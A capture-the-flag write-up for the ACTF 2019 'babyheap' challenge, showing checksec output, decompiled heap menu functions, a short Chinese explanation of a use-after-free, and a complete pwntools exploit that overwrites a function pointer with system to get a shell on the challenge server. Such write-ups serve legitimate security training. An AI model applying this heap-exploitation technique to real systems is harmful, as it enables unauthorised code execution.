# BUU-ACTF_2019_babyheap

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## IDA

**add**

```c
unsigned __int64 add()
{
  void **v0; // rbx
  int i; // [rsp+8h] [rbp-38h]
  int v3; // [rsp+Ch] [rbp-34h]
  char buf[24]; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 v5; // [rsp+28h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  if ( dword_60204C <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !*(&ptr + i) )
      {
        *(&ptr + i) = malloc(0x10uLL);
        *((_QWORD *)*(&ptr + i) + 1) = sub_40098A;
        puts("Please input size: ");
        read(0, buf, 8uLL);
        v3 = atoi(buf);
        v0 = (void **)*(&ptr + i);
        *v0 = malloc(v3);
        puts("Please input content: ");
        read(0, *(void **)*(&ptr + i), v3);
        ++dword_60204C;
        return __readfsqword(0x28u) ^ v5;
      }
    }
  }
  else
  {
    puts("The list is full");
  }
  return __readfsqword(0x28u) ^ v5;
}
```

**dele**

```c
unsigned __int64 sub_400BAE()
{
  int v1; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Please input list index: ");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 >= 0 && v1 < dword_60204C )
  {
    if ( *(&ptr + v1) )
    {
      free(*(void **)*(&ptr + v1));
      free(*(&ptr + v1));
    }
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

**show**

```c
unsigned __int64 sub_400C66()
{
  int v1; // [rsp+Ch] [rbp-24h]
  char buf[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("Please input list index: ");
  read(0, buf, 4uLL);
  v1 = atoi(buf);
  if ( v1 >= 0 && v1 < dword_60204C )
  {
    if ( *(&ptr + v1) )
      (*((void (__fastcall **)(_QWORD))*(&ptr + v1) + 1))(*(_QWORD *)*(&ptr + v1));
  }
  else
  {
    puts("Out of bound!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

类似`hacknote`，有UAF，修改show函数指针指向`system`，chunk指针指向`/bin/sh\x00`地址。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"

local=0
binary='./ACTF_2019_babyheap'
#gdb.attach(sh)
if local:
	#context.log_level="DEBUG"
	sh=process(binary)
else:
	sh=remote('node3.buuoj.cn',26509)

elf = ELF(binary,checksec=False)
#libc = ELF('./libc-2.27.so',checksec=False)

def add(size,content):
	sh.recvuntil("Your choice: ")
	sh.sendline("1")
	sh.recvuntil("Please input size: ")
	sh.sendline(str(size))
	sh.recvuntil("Please input content: ")
	sh.send(content)

def free(index):
	sh.recvuntil("Your choice: ")
	sh.sendline("2")
	sh.recvuntil("Please input list index: ")
	sh.sendline(str(index))

def show(index):
	sh.recvuntil("Your choice: ")
	sh.sendline("3")
	sh.recvuntil("Please input list index: ")
	sh.sendline(str(index))

bin_sh=0x602010
system=elf.plt['system']

add(0x80,"aaaa")
add(0x80,"bbbb")
add(0x80,"cccc")

free(1)
free(0)

add(0x10,p64(0x602010) + p64(system))

show(1)
sh.interactive()	
```

